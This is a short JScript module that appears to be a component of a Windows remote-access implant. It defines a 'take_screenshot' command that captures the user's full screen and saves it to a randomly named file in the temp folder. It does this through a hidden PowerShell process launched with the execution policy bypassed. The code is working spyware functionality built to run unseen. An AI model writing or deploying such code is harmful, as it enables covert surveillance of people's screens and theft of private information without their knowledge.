// chunk: commands/screenshot
// depends: core/run_cmd, core/file_ops
// provides: take_screenshot
// format: jscript

function take_screenshot() {
    var outFile = _s.ExpandEnvironmentStrings("%TEMP%") + "\\sc_" + Math.floor(Math.random() * 99999) + ".png";
    var ps = "Add-Type -A System.Windows.Forms,System.Drawing;";
    ps += "$b=[Drawing.Rectangle]::FromLTRB(0,0,[Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);";
    ps += "$bmp=New-Object Drawing.Bitmap($b.Width,$b.Height);";
    ps += "$g=[Drawing.Graphics]::FromImage($bmp);";
    ps += "$g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size);";
    ps += "$bmp.Save('" + outFile + "',[Drawing.Imaging.ImageFormat]::Png);";
    ps += "$g.Dispose();$bmp.Dispose()";
    _run("powershell -Ep Bypass -W Hidden -C \"" + ps + "\"");
    return outFile;
}
